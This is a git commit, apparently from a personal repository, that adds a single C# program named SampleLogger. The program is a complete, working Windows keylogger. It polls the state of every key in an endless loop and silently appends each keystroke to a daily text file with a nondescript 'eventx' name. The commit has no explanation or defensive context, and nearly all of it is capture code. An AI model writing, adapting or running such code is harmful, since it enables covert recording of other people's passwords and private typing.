33460bf7887d591243a41479d437d8b5d7f40ed1
Urim <xurimx@gmail.com>
2020-11-22 00:27:37 +0100

    Add project files.

---
+++ SampleLogger/Program.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace SampleLogger
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(int key);
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(100);
+                for (int i = 0; i < 255; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 1 || keyState == -32767)
+                    {
+                        StreamWriter writer = File.AppendText($"eventx-{DateTime.Now:yyyy-MM-dd}.txt");
+                        writer.Write((Keys)i);
+                        writer.Dispose();
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
